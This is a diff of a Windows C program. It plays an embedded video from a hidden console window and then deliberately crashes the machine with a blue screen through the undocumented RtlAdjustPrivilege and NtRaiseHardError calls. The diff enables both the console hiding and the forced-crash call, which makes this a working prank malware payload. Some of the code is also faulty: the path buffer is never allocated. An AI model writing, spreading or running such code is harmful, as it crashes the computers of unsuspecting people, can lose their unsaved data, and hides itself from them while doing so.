@@ -3,8 +3,8 @@
 #include <stdio.h>
 
 // pragmas for libraries needed
-#pragma comment(lib, "ntdll.lib") 		// bsod stuff
-#pragma comment(lib, "strmiids.lib") 	// most of directshow
+#pragma comment(lib, "ntdll.lib") 		// BSoD stuff
+#pragma comment(lib, "strmiids.lib") 	// most of DirectShow
 #pragma comment(lib, "ole32.lib") 		// CoInitialize and CoCreateInstance
 #pragma comment(lib, "user32.lib")		// ShowWindow
 
@@ -12,14 +12,14 @@
 extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrThread, PBOOLEAN StatusPointer);
 extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG Unless1, ULONG Unless2, PULONG_PTR Unless3, ULONG ValidResponseOption, PULONG ResponsePointer);
 
-// global variables for directshow
+// global variables for DirectShow
 IGraphBuilder*	graph = 0; 		// filter graph manager
 IMediaControl*	control = 0; 	// media control interface
 IMediaEvent*	event = 0; 		// media event interface
 IVideoWindow*	window = 0;		// the video window
 
 // helper functions
-void GetVideoResource(WCHAR** path) {
+void GetVideoResource(LPWSTR* path) {
 	// get the video resource data
 	HRSRC resource = FindResource(NULL, MAKEINTRESOURCE(1), RT_RCDATA);
 	HGLOBAL handle = LoadResource(NULL, resource);
@@ -27,17 +27,28 @@ void GetVideoResource(WCHAR** path) {
 	DWORD size = SizeofResource(NULL, resource);
 	LPVOID data = LockResource(handle);
 
-	// fill up a temporary file with the video data
+	// get the temporary path and append the video name
 	GetTempPathW(MAX_PATH, *path);	
 	StringCbCatW(*path, MAX_PATH, L"video.wmv");
 
+	// create the file handle
 	HANDLE file = CreateFileW(*path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 
+	// write the video data to the temporary path
 	WriteFile(file, data, size, NULL, NULL);
+
+	// close haandles
 	CloseHandle(file);
+	CloseHandle(handle);
+
+	// free the resource
+	FreeResource(resource);
 }
 
-void InitializeDirectShow(WCHAR** path) {
+void InitializeDirectShow(LPCWSTR* path) {
+	// initialize the COM
+	CoInitialize(NULL);
+
 	// create the filter graph manager
 	HRESULT result = CoCreateInstance(CLSID_FilterGraph, NULL, CLSCTX_INPROC_SERVER, IID_IGraphBuilder, (void**)&graph);
 
@@ -69,16 +80,16 @@ ULONG TriggerBSOD() {
 
 // main function
 int main() {
-	WCHAR* path = (WCHAR*)malloc(MAX_PATH);
+	LPWSTR path;
+	//WCHAR* path = L"C:\\Users\\Bem\\AppData\\Local\\Temp\\video.wmv";
 
 	HRESULT result;
 	LONG code;
-
-	CoInitialize(NULL); // initialize COM
-	//ShowWindow(GetConsoleWindow(), SW_HIDE); // hide console window
 	
+	ShowWindow(GetConsoleWindow(), SW_HIDE); // hide console window
+
 	GetVideoResource(&path); // get the video resource
-	InitializeDirectShow(&path); // initialize directshow stuff
+	InitializeDirectShow((LPCWSTR*)&path); // initialize directshow stuff
 
 	result = control->Run(); // play the video
 
@@ -87,7 +98,7 @@ int main() {
 	}
 
 	// trigger the blue screen of death
-	//TriggerBSOD();
+	TriggerBSOD();
 
 	// if it gets here, the BSoD failed :(
 	return 1;
